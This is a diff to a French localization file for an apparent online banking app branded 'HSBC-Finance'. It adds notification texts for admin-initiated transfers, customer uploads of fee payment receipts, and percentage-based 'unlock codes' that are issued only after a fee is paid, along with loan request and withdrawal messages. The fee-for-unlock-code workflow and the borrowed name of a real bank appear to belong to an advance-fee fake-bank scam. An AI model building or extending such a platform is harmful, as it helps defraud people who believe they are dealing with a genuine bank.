@@ -760,7 +760,37 @@
       "instantTitle": "Virement instantané reçu",
       "classicTitle": "Virement en cours",
       "instantMsg": "{{amount}} ont été crédités sur le compte {{iban4}}…{{ibanLast}} (réf. {{ref}})",
-      "classicMsg": "Un virement classique de {{amount}} a été initié (crédit sous 1 jour ouvré, réf. {{ref}})"
+      "classicMsg": "Un virement classique de {{amount}} a été initié (crédit sous 1 jour ouvré, réf. {{ref}})",
+      "adminInitTitle": "Nouveau virement initié",
+      "adminInitMsg": "{{amount}} → {{beneficiary}} (réf. {{ref}})"
+    },
+    "transferProcess": {
+      "adminValidationTitle": "Reçu à valider",
+      "adminValidationMsg": "Un client a envoyé un reçu de paiement à valider.",
+      "adminReceiptTitle": "Nouveau reçu reçu",
+      "adminReceiptMsg": "Un nouveau reçu de paiement de frais a été déposé."
+    },
+    "adminCodes": {
+      "codeTitle": "Code de déblocage {{p}}%",
+      "codeMsg": "Votre code : {{code}} (frais {{fee}})",
+      "rejectedTitle": "Reçu refusé",
+      "rejectedMsg": "Veuillez renvoyer un reçu valide.",
+      "manualCodeTitle": "Code de déblocage {{p}}%",
+      "manualCodeMsg": "Votre code de déblocage est : {{code}}"
+    },
+    "loan": {
+      "newRequestAdminTitle": "Nouvelle demande de prêt",
+      "newRequestAdminMsg": "{{name}} demande {{amount}} € sur {{months}} mois",
+      "statusTitle": "Statut de votre demande mis à jour",
+      "statusMsg": "Votre demande de {{amount}} est désormais : $t(status.{{statusKey}})",
+      "signedReceivedTitle": "Contrat signé reçu",
+      "signedReceivedMsg": "{{name}} a signé son contrat (demande {{id}})"
+    },
+    "withdrawal": {
+      "sentTitle": "Virement exécuté",
+      "sentMsg": "{{amount}} ont été envoyés sur {{iban4}}…{{ibanLast}} (réf. {{ref}})",
+      "rejectedTitle": "Virement rejeté · fonds recrédités",
+      "rejectedMsg": "Votre virement de {{amount}} a été rejeté. Le solde a été recrédité automatiquement."
     }
   },
   "settings": {
@@ -875,12 +905,11 @@
     "feature2": "Chiffrement de bout en bout",
     "feature3": "Expérience premium"
   },
-
   "authPending": {
-  "title": "Vérifiez votre email",
-  "description": "Nous avons envoyé un lien de confirmation à votre adresse email.",
-  "instruction": "Cliquez sur le lien dans votre boîte mail pour activer votre compte.",
-  "loading": "En attente de confirmation...",
-  "footer": "Pour votre sécurité, ne partagez jamais vos identifiants. HSBC-Finance ne vous demandera jamais votre mot de passe."
-}
+    "title": "Vérifiez votre email",
+    "description": "Nous avons envoyé un lien de confirmation à votre adresse email.",
+    "instruction": "Cliquez sur le lien dans votre boîte mail pour activer votre compte.",
+    "loading": "En attente de confirmation...",
+    "footer": "Pour votre sécurité, ne partagez jamais vos identifiants. HSBC-Finance ne vous demandera jamais votre mot de passe."
+  }
 }
